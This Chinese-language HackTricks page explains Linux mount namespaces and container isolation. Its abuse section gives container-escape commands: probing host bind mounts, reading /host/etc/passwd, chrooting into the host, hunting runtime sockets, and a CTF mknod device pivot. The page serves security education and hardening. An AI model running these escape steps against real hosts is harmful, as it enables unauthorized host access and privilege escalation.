# Mount Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## 概述

挂载命名空间控制进程所能看到的**挂载表**。这是最重要的容器隔离功能之一，因为根文件系统、bind mounts、tmpfs mounts、procfs 视图、sysfs 暴露，以及许多特定于运行时的辅助挂载，全部都通过该挂载表来表示。两个进程可能都能访问 `/`、`/proc`、`/sys` 或 `/tmp`，但这些路径实际解析到什么内容，取决于它们所在的挂载命名空间。

从容器安全的角度来看，挂载命名空间往往决定了这究竟是“一个经过妥善准备的应用文件系统”，还是“该进程可以直接查看或影响主机文件系统”。这就是为什么 bind mounts、`hostPath` volumes、特权挂载操作，以及可写的 `/proc` 或 `/sys` 暴露，都围绕这个命名空间展开。

## 操作

当运行时启动容器时，通常会创建一个新的挂载命名空间，为容器准备根文件系统，按需挂载 procfs 和其他辅助文件系统，然后可选地添加 bind mounts、tmpfs mounts、secrets、config maps 或 host paths。进程在该命名空间内运行后，它所看到的挂载集合基本上就与主机的默认视图解耦了。主机仍然可以看到底层的真实文件系统，但容器看到的是运行时为其组装的版本。

这很强大，因为它能让容器认为自己拥有独立的根文件系统，尽管所有内容仍由主机管理。但这也很危险，因为如果运行时暴露了错误的挂载，进程就会突然获得对主机资源的可见性，而其余安全模型可能根本没有设计为保护这些资源。

## 实验

你可以使用以下命令创建一个私有挂载命名空间：
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
如果你在该 namespace 外部打开另一个 shell 并检查 mount table，你会看到 tmpfs mount 只存在于隔离的 mount namespace 中。这是一个很有用的练习，因为它表明 mount isolation 并不是抽象理论；kernel 确实在向该进程呈现不同的 mount table。
如果你在该 namespace 外部打开另一个 shell 并检查 mount table，tmpfs mount 将只存在于隔离的 mount namespace 中。

在 containers 内部，一个快速的比较是：
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
第二个示例展示了 runtime configuration 是多么容易地在 filesystem boundary 上造成巨大的安全漏洞。

## Runtime Usage

Docker、Podman、基于 containerd 的 stack 以及 CRI-O 都依赖 private mount namespace 来运行普通容器。Kubernetes 在此机制之上实现 volumes、projected secrets、config maps 和 `hostPath` mounts。Incus/LXC 环境同样高度依赖 mount namespaces，尤其是因为 system containers 通常会暴露比 application containers 更丰富、更接近真实机器的 filesystems。

这意味着，当你检查 container filesystem 问题时，通常并不是在处理某个孤立的 Docker 特性。你面对的是一个通过启动该 workload 的平台表现出来的 mount-namespace 和 runtime-configuration 问题。

## Misconfigurations

最明显且危险的错误，是通过 bind mount 暴露 host root filesystem 或其他敏感的 host path，例如 `-v /:/host`，或者在 Kubernetes 中使用可写的 `hostPath`。此时，问题已经不再是“container 能否以某种方式 escape”，而是“哪些有用的 host 内容已经可以被直接查看和写入？”可写的 host bind mount 通常会让后续 exploit 变得非常简单，只需进行文件放置、chrooting、配置修改或 runtime socket discovery。

另一个常见问题，是以绕过更安全的 container view 的方式暴露 host `/proc` 或 `/sys`。这些 filesystems 并不是普通的数据 mounts；它们是访问 kernel 和 process state 的 interfaces。如果 workload 可以直接访问 host 版本，那么 container hardening 所依赖的许多假设就不再完全适用。

Read-only protections 同样重要。read-only root filesystem 并不能自动确保 container 安全，但它会移除大量 attacker staging space，并使 persistence、helper-binary placement 和 config tampering 变得更加困难。相反，可写的 root 或可写的 host bind mount 会为 attacker 准备下一步提供空间。

## Abuse

当 mount namespace 被滥用时，attackers 通常会采取以下四种行动之一。他们会**读取本应留在 container 外部的 host data**。他们会通过可写的 bind mounts **修改 host configuration**。如果 capabilities 和 seccomp 允许，他们会**mount 或 remount 其他 resources**。或者，他们会**访问 powerful sockets 和 runtime state directories**，借此要求 container platform 本身提供更多 access。

如果 container 已经能够看到 host filesystem，那么整个 security model 会立即发生改变。

当你怀疑存在 host bind mount 时，首先确认有哪些内容可用，以及这些内容是否可写：
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
如果主机根文件系统以可读写方式挂载，直接访问主机通常只需：
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
如果目标是获取特权运行时访问权限，而不是直接执行 chroot，则枚举套接字和运行时状态：
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
如果存在 `CAP_SYS_ADMIN`，还应测试是否可以从 container 内部创建新挂载：
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### 完整示例：Two-Shell `mknod` Pivot

当 container root user 能够创建 block devices、host 和 container 以有用的方式共享 user identity，并且 attacker 已经在 host 上取得 low-privilege foothold 时，会出现一种更特殊的 abuse path。在这种情况下，container 可以创建类似 `/dev/sda` 的 device node，而 low-privilege host user 随后可以通过匹配的 container process 的 `/proc/<pid>/root/` 读取它。

在 container 内：
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
在主机上，在定位到容器 shell 的 PID 后，使用对应的低权限用户：
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
重要的教训并不是精确的 CTF 字符串搜索，而是：即使 cgroup device policy 阻止了在 container 内部直接使用，mount-namespace exposure through `/proc/<pid>/root/` 仍可能让 host user 重用由 container 创建的 device nodes。

## Checks

这些命令用于展示当前进程实际所在的 filesystem view。目标是发现源自 host 的 mounts、可写的敏感路径，以及任何看起来比普通 application container root filesystem 更宽泛的内容。
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
这里值得关注的是：

- 来自主机的 Bind mounts，尤其是 `/`、`/proc`、`/sys`、runtime state 目录或 socket 位置，应立即引起注意。
- 意外的可读写挂载通常比大量只读 helper 挂载更重要。
- `mountinfo` 通常是判断某个路径究竟来自主机还是由 overlay 提供的最佳位置。

这些检查可以确认**此 namespace 中可见的资源**、**哪些资源来自主机**，以及**哪些资源可写或涉及安全敏感内容**。
{{#include ../../../../../banners/hacktricks-training.md}}
